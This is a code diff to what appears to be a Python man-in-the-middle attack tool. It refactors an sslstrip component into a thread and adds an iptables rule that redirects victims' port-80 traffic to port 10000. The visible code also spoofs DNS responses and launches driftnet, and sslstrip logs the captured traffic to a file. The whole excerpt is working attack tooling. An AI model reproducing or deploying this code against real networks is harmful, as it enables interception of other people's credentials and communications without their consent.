@@ -225,12 +225,10 @@ class dnsspoof(threading.Thread):
 				send(mkspoof(DNSpkt))
 				print colors.OKGREEN + '[+] Spoofed:', DNSpkt.qd.qname + colors.ENDC
 
-#class ssltrip(threading.Thread):
-#	def run(self):
-def sslstrip():
-	print 'Redirecting traffic to port 10000 and starting sslstrip\n'
-	ip10000 = bash('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000')
-	sslstrip = bash('xterm -e sslstrip -f -w sslstrip.txt')
+class sslstrip(threading.Thread):
+	def run(self):
+		print 'Redirecting traffic to port 10000 and starting sslstrip\n'
+		sslstrip = bash('xterm -e sslstrip -f -w sslstrip.txt')
 
 print "Active interface = " + interface
 print "Router IP = " + routerIP
@@ -268,7 +266,10 @@ def main():
 		driftnet = bash('xterm -e driftnet -i %s' % interface)
 
 	if args.sslstrip:
-		sslstrip()
+		ip10000 = bash('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000')
+		ssl = sslstrip()
+		ssl.daemon = True
+		ssl.start()
 
 	if args.dnsspoof:
 		ds = dnsspoof()
